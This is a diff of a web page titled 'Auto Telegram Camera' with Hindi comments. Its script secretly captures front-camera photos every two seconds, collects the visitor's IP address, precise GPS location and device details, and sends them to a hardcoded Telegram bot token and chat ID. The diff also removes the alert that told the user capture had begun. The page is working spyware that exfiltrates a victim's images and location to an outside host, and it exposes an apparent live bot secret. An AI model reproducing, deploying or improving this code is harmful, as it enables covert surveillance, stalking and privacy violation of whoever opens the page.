@@ -2,8 +2,6 @@
 <html>
 <head>
 <meta charset="UTF-8">
-
-<!-- Mobile viewport -->
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <title>Auto Telegram Camera</title>
@@ -45,46 +43,21 @@
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 
-/*
- BOT_TOKEN:
- Telegram bot ka secret token
-*/
 const BOT_TOKEN = "7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";
-
-/*
- CHAT_ID:
- Jis chat me photo + details jayengi
-*/
 const CHAT_ID = "8319568593";
 
 let intervalId = null;
-let userIP = "Unknown";
 let latitude = "N/A";
 let longitude = "N/A";
 let mapLink = "Location not allowed";
+let userIP = "Unknown";
 
-// 🔹 Public IP
+// 🔹 IP
 fetch("https://api.ipify.org?format=json")
-    .then(res => res.json())
-    .then(data => userIP = data.ip)
-    .catch(() => userIP = "IP not available");
+    .then(r => r.json())
+    .then(d => userIP = d.ip);
 
-// 🔹 Location permission (GPS)
-if ("geolocation" in navigator) {
-    navigator.geolocation.getCurrentPosition(
-        pos => {
-            latitude = pos.coords.latitude.toFixed(6);
-            longitude = pos.coords.longitude.toFixed(6);
-            mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-        },
-        err => {
-            mapLink = "Location permission denied";
-        },
-        { enableHighAccuracy: true, timeout: 10000 }
-    );
-}
-
-// 🔹 Front camera only
+// 🔹 Camera
 navigator.mediaDevices.getUserMedia({
     video: { facingMode: "user" }
 }).then(stream => {
@@ -92,9 +65,25 @@ navigator.mediaDevices.getUserMedia({
 });
 
 function start() {
-    if (intervalId) return;
-    intervalId = setInterval(captureAndSend, 2000);
-    alert("Auto capture started (every 2 seconds)");
+
+    // 📍 LOCATION PERMISSION — user click ke baad
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                latitude = pos.coords.latitude.toFixed(6);
+                longitude = pos.coords.longitude.toFixed(6);
+                mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            },
+            () => {
+                mapLink = "Location denied";
+            },
+            { enableHighAccuracy: true }
+        );
+    }
+
+    if (!intervalId) {
+        intervalId = setInterval(captureAndSend, 2000);
+    }
 }
 
 function captureAndSend() {
@@ -111,20 +100,17 @@ function captureAndSend() {
         const caption = `
 📸 Auto Capture
 
-📱 Device:
-${navigator.userAgent}
-
-🖥 Platform: ${navigator.platform}
-🌐 Language: ${navigator.language}
-📐 Screen: ${screen.width}x${screen.height}
+📱 ${navigator.userAgent}
+🖥 ${navigator.platform}
+📐 ${screen.width}x${screen.height}
 
 📍 Location:
 Lat: ${latitude}
 Lng: ${longitude}
-🗺 Map: ${mapLink}
+🗺 ${mapLink}
 
 🌍 IP: ${userIP}
-⏰ Time: ${new Date().toLocaleString()}
+⏰ ${new Date().toLocaleString()}
         `;
 
         const formData = new FormData();
@@ -135,7 +121,7 @@ Lng: ${longitude}
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
             method: "POST",
             body: formData
-        }).catch(err => console.error(err));
+        });
 
     }, "image/jpeg", 0.7);
 }
